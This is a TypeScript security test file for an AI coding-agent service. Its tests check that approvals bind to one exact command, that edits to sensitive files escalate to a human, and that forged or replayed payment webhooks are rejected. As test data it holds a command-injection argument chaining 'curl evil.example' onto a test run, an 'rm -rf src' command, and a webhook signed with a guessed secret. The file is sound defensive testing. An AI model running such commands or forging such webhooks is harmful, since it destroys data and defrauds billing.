/**
 * Identity and privilege abuse, and trust in approvals (ASI03, ASI08, ASI09):
 * an approval reused for something else, sensitive changes slipping through
 * autonomy, and a payment webhook forged to buy a plan.
 */
import { afterEach, describe, expect, it } from "vitest";
import { approvalBindingHash, checkApprovalForExecution, type ApprovalSubject } from "@/core/trust/approval";
import { evaluateChangePolicy, type AutonomyLimits } from "@/core/trust/policy";
import type { AppliedState } from "@/core/billing/provider-state";
import { createDodoClient } from "@/server/billing/providers/dodo/client";
import { signWebhook } from "@/server/billing/providers/dodo/webhook";
import { receiveWebhook, type WebhookDeps } from "@/server/billing/webhooks";
import { obedientModel, project, recordingRunner, run, tool, type Project } from "./support";

const SUBJECT: ApprovalSubject = {
  action: { tool: "run_command", program: "pnpm", args: ["test"], where: "sandbox" },
  contractVersion: "3",
  policyVersion: "a".repeat(64),
  resourceVersion: "run-1",
};
const NOW = new Date("2026-10-23T10:00:00Z");

let p: Project | null = null;
afterEach(async () => {
  await p?.cleanup();
  p = null;
});

describe("SE-008 An approval reused for something else", () => {
  it("covers one exact payload and set of versions, and expires", async () => {
    const record = { id: "a1", state: "approved" as const, bindingHash: await approvalBindingHash(SUBJECT), expiresAt: new Date(NOW.getTime() + 60_000) };
    expect(await checkApprovalForExecution(record, SUBJECT, NOW)).toEqual({ valid: true });
    const swapped: ApprovalSubject[] = [
      { ...SUBJECT, action: { ...(SUBJECT.action as object), args: ["test", "&&", "curl", "evil.example"] } },
      { ...SUBJECT, action: { ...(SUBJECT.action as object), where: "local" } },
      { ...SUBJECT, contractVersion: "4" },
      { ...SUBJECT, policyVersion: "b".repeat(64) },
      { ...SUBJECT, resourceVersion: "run-2" },
    ];
    for (const s of swapped) expect(await checkApprovalForExecution(record, s, NOW)).toMatchObject({ valid: false, reason: "BINDING_MISMATCH" });
    expect(await checkApprovalForExecution(record, SUBJECT, new Date(NOW.getTime() + 60_000))).toMatchObject({ valid: false, reason: "EXPIRED" });
    expect(await checkApprovalForExecution({ ...record, state: "pending" }, SUBJECT, NOW)).toMatchObject({ valid: false, reason: "NOT_APPROVED" });
  });

  it("doesn't run a command when the approval it gets back is for a different one", async () => {
    p = await project({ "README.md": "# Demo\n" });
    const runner = recordingRunner("local");
    const obey = obedientModel([() => [tool("c", "run_command", { program: "pnpm", args: ["test"], reason: "Check it." })]]);
    // Someone answers with a binding hash for another command: the loop refuses it.
    const other = await approvalBindingHash({ ...SUBJECT, action: { tool: "run_command", program: "rm", args: ["-rf", "src"], where: "local" } });
    const { approvals } = await run({ model: obey.model, workspace: await p.workspace("disk"), mode: "controlled", commands: runner }, () => ({ approved: true, bindingHash: other }));
    expect(approvals).toHaveLength(1);
    expect(runner.ran).toEqual([]);
    expect(obey.seen[1]![0]).toMatchObject({ isError: true, content: expect.stringMatching(/didn't match this exact command/) });
  });
});

describe("SE-009 Sensitive files slipping through autonomy", () => {
  const LEVEL_2: AutonomyLimits = { level: 2, maxFiles: 5, allowCreates: true };
  const SENSITIVE = [
    "supabase/migrations/20261103_drop.sql",
    ".github/workflows/deploy.yml",
    "package.json",
    "Dockerfile",
    "src/auth/session.ts",
    "src/proxy.ts",
    "infra/main.tf",
    "next.config.ts",
  ];

  it("escalates each sensitive file to an owner or admin, even with autonomy on and checks available", async () => {
    for (const path of SENSITIVE) {
      const d = await evaluateChangePolicy({ rules: null, files: [{ path, kind: "edit" }], contractViolations: [], autonomy: LEVEL_2, verifiable: true });
      expect(d.outcome, path).toBe("ESCALATE");
    }
  });

  it("never lowers a block or an escalation, and escalates very large changes", async () => {
    const blocked = await evaluateChangePolicy({ rules: null, files: [{ path: "README.md", kind: "edit" }], contractViolations: [{ kind: "scope", detail: "outside the contract" }], autonomy: LEVEL_2, verifiable: true });
    expect(blocked.outcome).toBe("BLOCK");
    const many = Array.from({ length: 11 }, (_, i) => ({ path: `docs/page-${i}.md`, kind: "edit" as const }));
    expect((await evaluateChangePolicy({ rules: null, files: many, contractViolations: [], autonomy: { ...LEVEL_2, maxFiles: 5 }, verifiable: true })).outcome).toBe("ESCALATE");
    // The control: an ordinary small change does apply on its own, so the refusals above come from the risk.
    expect((await evaluateChangePolicy({ rules: null, files: [{ path: "docs/intro.md", kind: "edit" }], contractViolations: [], autonomy: LEVEL_2, verifiable: true })).outcome).toBe("ALLOW_WITHIN_LIMITS");
  });
});

describe("SE-035 A forged or replayed payment webhook", () => {
  it("grants no plan without a valid signature, takes state only from the provider, and applies a replay once", async () => {
    const secret = `whsec_${Buffer.from("mock-secret-for-the-security-eval").toString("base64")}`;
    const org = "00000000-0000-4000-8000-0000000000f1";
    const now = new Date("2026-11-03T09:00:00Z");
    const stored = new Set<string>();
    const applied: AppliedState[] = [];
    // The provider, mocked: the subscription is still pending, whatever a webhook claims.
    const dodo = createDodoClient({
      apiKey: "mock",
      baseUrl: "https://test.dodopayments.com",
      mode: "test",
      fetch: async () =>
        new Response(JSON.stringify({ subscription_id: "sub_mock", status: "pending", product_id: "pdt_mock_max3", created_at: now.toISOString(), customer: { customer_id: "cus_mock" }, metadata: { farbaek_org: org } })),
    });
    const deps: WebhookDeps = {
      config: { provider: "dodo", mode: "test", apiKey: "mock", webhookKey: secret, baseUrl: "https://test.dodopayments.com", testWorkspaces: new Set([org]), siteUrl: "https://www.farbaek.com" },
      provider: dodo,
      record: async (e) => (stored.has(e.webhookId) ? null : (stored.add(e.webhookId), e.webhookId)),
      claim: async (_l, id) => (id ? [{ id, mode: "test", type: "subscription.active", subscriptionId: "sub_mock", orgId: org, attempts: 1 }] : []),
      finish: async (_id, status) => status,
      planForProduct: async () => "max_3x",
      orgForSubscription: async () => null,
      apply: async (_o, _s, state) => (applied.push(state), "applied"),
      now: () => now,
    };
    const body = JSON.stringify({ type: "subscription.active", timestamp: now.toISOString(), data: { subscription_id: "sub_mock", status: "active", metadata: { farbaek_org: org } } });
    const deliver = async (signature: string, id = "msg_forged") => {
      const later: (() => Promise<void>)[] = [];
      const headers = { "webhook-id": id, "webhook-timestamp": String(now.getTime() / 1000), "webhook-signature": signature };
      const res = await receiveWebhook(new Request("https://www.farbaek.com/api/webhooks/dodo", { method: "POST", headers, body }), deps, (w) => later.push(w));
      for (const w of later) await w();
      return res.status;
    };
    // Forged: signed with another secret, or not at all. Refused before anything is stored.
    const wrong = `whsec_${Buffer.from("an-attacker-guess-at-the-secret!!").toString("base64")}`;
    expect(await deliver(`v1,${signWebhook("msg_forged", now.getTime() / 1000, body, wrong)}`)).toBe(401);
    expect(await deliver("v1,")).toBe(401);
    expect(stored.size).toBe(0);
    // Genuinely signed, but claiming "active": the provider says pending, so no plan is granted.
    const real = `v1,${signWebhook("msg_real", now.getTime() / 1000, body, secret)}`;
    expect(await deliver(real, "msg_real")).toBe(200);
    expect(applied).toEqual([]);
    // Replayed: stored once, so it does nothing the second time.
    expect(await deliver(real, "msg_real")).toBe(200);
    expect(stored.size).toBe(1);
  });
});
